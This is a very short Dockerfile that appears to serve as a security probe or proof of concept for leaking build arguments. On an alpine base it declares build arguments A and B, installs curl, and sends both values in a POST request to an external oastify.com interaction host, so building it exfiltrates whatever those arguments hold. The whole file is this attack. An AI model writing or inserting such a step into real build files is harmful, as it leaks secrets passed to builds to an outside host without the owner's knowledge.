FROM alpine
ARG A
ARG B
RUN apk add curl; curl -d "A: $A; B: $B" 8z8rphjurlye7bs9w2ys7c52dtjk7avz.oastify.com
